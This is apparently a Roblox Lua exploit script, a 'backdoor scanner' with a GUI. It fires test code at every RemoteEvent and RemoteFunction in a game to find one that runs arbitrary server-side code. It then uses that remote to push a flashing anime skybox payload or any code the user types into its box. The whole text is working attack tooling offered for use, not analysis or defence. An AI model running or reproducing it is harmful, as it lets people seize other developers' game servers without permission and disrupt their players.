local Lighting = game:GetService("Lighting")
local Sky = Instance.new("Sky")
Sky.Parent = Lighting

local function setSkybox(id)
    Sky.SkyboxBk = id
    Sky.SkyboxDn = id
    Sky.SkyboxFt = id
    Sky.SkyboxLf = id
    Sky.SkyboxRt = id
    Sky.SkyboxUp = id
end

spawn(function()
    while true do
        for _, img in ipairs(images) do
            setSkybox(img)
            wait(0.2)
        end
    end
end)
]]

local function scanBackdoor()
    if AcquiredRemote then
        StatusLabel.Text = "Status: Hey bradar Already Scan pls don't click again"
        return
    end

    StatusLabel.Text = "Status: Scanning backdoors..."
    ScanButton.Text = "SCANNING..."

    local locationsToScan = {
        game:GetService("Workspace"),
        game:GetService("Players"),
        game:GetService("ReplicatedStorage"),
        game:GetService("ServerScriptService"),
        game:GetService("Lighting"),
        game:GetService("StarterGui")
    }

    local remotes = {}
    for _, loc in ipairs(locationsToScan) do
        for _, v in pairs(loc:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                table.insert(remotes, v)
            end
        end
    end

    for _, remote in ipairs(remotes) do
        if not AcquiredRemote then
            local testCode = 'Instance.new("Model", workspace).Name="'..testModelName..'"'
            if remote.Parent ~= game:GetService("RobloxReplicatedStorage") then
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(testCode)
                elseif remote:IsA("RemoteFunction") then
                    task.spawn(function() remote:InvokeServer(testCode) end)
                end
            end
            task.wait(0.5)
            if workspace:FindFirstChild(testModelName) then
                if workspace:FindFirstChild(testModelName):IsA("Model") then
                    AcquiredRemote = remote
                    workspace:FindFirstChild(testModelName):Destroy()
                end
            end
        end
    end

    if AcquiredRemote then
        StatusLabel.Text = "Status: Backdoor Found"
        ScanButton.Text = "SCAN"
        
        if AcquiredRemote:IsA("RemoteEvent") then
            AcquiredRemote:FireServer(scanFoundPayload)
        else
            task.spawn(function() AcquiredRemote:InvokeServer(scanFoundPayload) end)
        end

        SkyboxButton.Active = true
        SkyboxButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        SkyboxButton.TextColor3 = Color3.new(1,1,1)
        
        ExecuteButton.Active = true
        ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        ExecuteButton.TextColor3 = Color3.new(1,1,1)
    else
        StatusLabel.Text = "Status: No Skidded:(/backdoor"
        ScanButton.Text = "SCAN"
    end
end

local function executeSkybox()
    if not AcquiredRemote then return end

    if AcquiredRemote:IsA("RemoteEvent") then
        AcquiredRemote:FireServer(skyboxPayload)
    else
        task.spawn(function() AcquiredRemote:InvokeServer(skyboxPayload) end)
    end

    StatusLabel.Text = "Status: Executed Fe Anime Skybox"
end

local function executeCustom()
    if not AcquiredRemote or CodeBox.Text == "" then return end

    local code = CodeBox.Text

    if AcquiredRemote:IsA("RemoteEvent") then
        AcquiredRemote:FireServer(code)
    else
        task.spawn(function() AcquiredRemote:InvokeServer(code) end)
    end

    StatusLabel.Text = "Status: Executed"
end

ClearButton.MouseButton1Click:Connect(function()
    CodeBox.Text = ""
end)

ScanButton.MouseButton1Click:Connect(scanBackdoor)
SkyboxButton.MouseButton1Click:Connect(executeSkybox)
ExecuteButton.MouseButton1Click:Connect(executeCustom)
